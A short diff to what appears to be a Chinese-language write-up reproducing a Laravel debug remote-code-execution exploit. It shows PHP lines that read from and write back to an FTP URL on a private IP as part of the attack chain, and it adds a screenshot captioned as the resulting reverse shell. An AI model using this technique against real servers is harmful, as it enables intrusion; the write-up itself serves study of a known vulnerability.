@@ -23,6 +23,9 @@ https://blog.csdn.net/qq981378640/article/details/51254177
 `$a = file_get_contents("ftp://aaa@172.16.230.146:23/123");`
 `file_put_contents("ftp://aaa@172.16.230.146:23/123", $a);`
 
+反弹回的shell:
+
+![](https://mmbiz.qpic.cn/mmbiz_jpg/1YLJUhm0ZtlwAYYnTsn47LmZt7GOXmwgGcicmWdouVUM6a04jjUAapuCLDeW7JEINazFGL04icicXXaZRBYyuy63A/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
 
 关于laravle debug rce的复现在这里：
 
